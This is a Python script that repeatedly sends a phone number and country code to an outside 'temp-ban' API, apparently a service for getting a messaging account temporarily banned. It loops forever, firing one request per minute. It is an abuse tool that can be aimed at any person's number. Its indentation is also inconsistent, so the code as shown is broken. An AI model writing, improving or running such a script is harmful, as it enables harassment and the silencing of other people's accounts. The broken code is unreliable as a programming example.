import time

try:
    import requests
except ImportError:
    print("Installing 'requests' module...")
    try:
        import pip
        pip.main(['install', 'requests'])
        import requests
        print("'requests' module installed successfully!")
    except Exception as e:
        print(f"Error installing 'requests' module: {e}")
        exit(1)

def temp_ban_api(country_code, phone_number):
 try:
        api_url = f"https://api-bruxiintk.online/api/temp-ban?apikey=bx&ddi={country_code}&numero={phone_number}"
        response = requests.get(api_url)
        response.raise_for_status()  # Raise an exception for HTTP errors
        if response.status_code == 200:
            return "Successfully done"
        else:
            return "Not done"
    except requests.exceptions.RequestException as e:
        return f"Error: {e}"
   # Your existing code for temp_ban_api function...

def main():
    country_code = input("Enter your country code number (e.g., 91): ")
    if not country_code.startswith("+"):
        country_code = "+" + country_code
    
    phone_number = input("Enter your phone number: ")
    phone_number = phone_number.replace(" ", "")  # Remove spaces
    
    while True:
        result = temp_ban_api(country_code, phone_number)
        print(result)
        time.sleep(60)  # Delay for 1 minute

if __name__ == "__main__":
    main()
